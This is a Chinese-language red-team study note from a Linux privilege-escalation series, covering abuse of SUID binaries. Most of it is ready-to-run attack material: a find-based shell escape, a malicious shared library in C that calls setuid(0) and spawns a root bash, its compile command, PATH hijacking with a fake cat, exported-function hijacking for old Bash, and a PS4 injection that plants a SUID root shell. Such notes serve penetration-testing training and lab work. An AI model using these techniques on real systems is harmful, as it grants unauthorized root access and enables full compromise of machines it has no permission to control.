---
title: Linux提权4：SUID 机制滥用 (红队笔记)
date: 2026-03-20 7:00:00
tags:

- 提权
- Linux
- 经典方法
- SUID
categories:
- ISW
- Linux提权

---





# 前言：

本篇讲的是第二类：SUID 机制滥用提权方法



# 基础知识：

在 Linux 提权体系中，SUID（Set Owner User ID up on execution）是最肥的一块肉。理解了它，你就掌握了打穿一半以上靶机的钥匙。

## 什么是suid？

正常情况下，你以**普通用户**的身份运行一个程序，这个程序就只有**普通用户**的权限。

但是，如果文件的所有者（通常是 root）给这个程序设置了 **SUID 权限**（在 `ls -l` 的权限位中，本该是 `x` 的地方变成了 **`s`**，例如 `-rwsr-xr-x`），那么**无论谁运行这个程序，程序在运行的瞬间，都会暂时获得文件所有者（root）的最高权限**



## 如何寻找系统中的 SUID 文件

手动信息收集已经说过，就是用下面的这条命令：

```bash
find / -perm -u=s -type f 2>/dev/null
```

重点关注那些**不该出现在这里**的命令，比如 `find`, `vim`, `nmap`, `bash`, `cp`, 或者管理员自己写的脚本（如 `backup`, `sysinfo`）。



# 实战：

情况一：SUID 已知可执行文件提权
---------------------------------

如果你找到的 SUID 文件是系统常见命令，直接利用其内置功能逃逸。

* **核心工具**：GTFOBins知识库去找命令，或者去SearchSploit查内核/软件漏洞exp

* **实例**：如果 `/usr/bin/find` 有 SUID：
  
  ```bash
  /usr/bin/find . -exec /bin/sh -p \; -quit
  ```

        (注意：`-p` 极其关键，防止 Bash 自动降权)

## 情况二：SUID 共享库 (SO) 注入提权

**利用场景**：SUID 程序运行时尝试加载某个 `.so` 库文件，但该文件在指定路径下不存在。

我们可以strings 1.elf看1文件中有没有什么关键字符串，可以帮助我们确定该文件是不是共享库

或者直接运行这个可执行文件，看他有什么交互

1. **寻找缺失库**：
   
   ```bash
   strace /usr/local/bin/suid_tool 2>&1 | grep -iE "open|no such file"
   ```

2. **伪造恶意库 (C 代码)**：
   
   ```bash
   #include <stdio.h>
   #include <stdlib.h>
   static void inject() __attribute__((constructor));
   void inject() {
       setgid(0);
       setuid(0); 
       system("/bin/bash -p");
   }
   ```

3. **编译并执行**：将编译后的 `.so` 放在程序找不着的那个路径，运行 SUID 程序即可触发。编译代码：
   
   ```bash
   gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
   ```
   
   

情况三：SUID 环境变量 PATH 劫持提权
-----------------------

**利用场景**：SUID 程序内部调用了其他命令（如 `cat`），但没有使用绝对路径。

1. **伪造命令**：在 `/tmp` 下写一个假 `cat`，内容为 `/bin/bash -p`。

2. **劫持路径**：`export PATH=/tmp:$PATH`

3. **触发**：运行 SUID 程序，它会去 `/tmp` 找 `cat`，从而执行我们的 Bash。
   
   

情况四：巧用 SUID-shell 功能提权 #1 （导出函数）
--------------------------------

**适用环境**：Bash 版本 < 4.2。

**利用原理**：在旧版 Bash 中，可以定义一个和“绝对路径”长得一模一样的函数，并将其导出。当 SUID 程序内部调用如 `/usr/bin/service` 时，它会误把你的函数当成命令执行。

* **实战操作**：
  
  ```bash
  # 假设 SUID 程序内部调用了 /usr/sbin/service
  function /usr/sbin/service { /bin/bash -p; } # 定义函数
  export -f /usr/sbin/service # 导出函数到环境变量
  # 运行 SUID 程序，成功提权
  ```

情况五：巧用 SUID-shell 功能提权 #2 (调试模式 PS4)
------------------------------------

**适用环境**：Bash 版本 < 4.4。

**利用原理**：利用 Bash 的调试功能环境变量 `PS4`。当以调试模式运行脚本时，`PS4` 里的命令会被执行。

* **实战操作**：
  
  ```bash
  env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid_target
  # 然后运行生成的 /tmp/rootbash -p
  ```
  
  
  
  

# 小tips：

1. **`-p` 参数是灵魂**：现代 Bash 发现 eUID 与 UID 不符时会丢弃特权，必须加 `-p`。

2. **版本号很重要**：手法四和手法五对 Bash 版本有硬性要求，实战前先敲 `bash --version`。


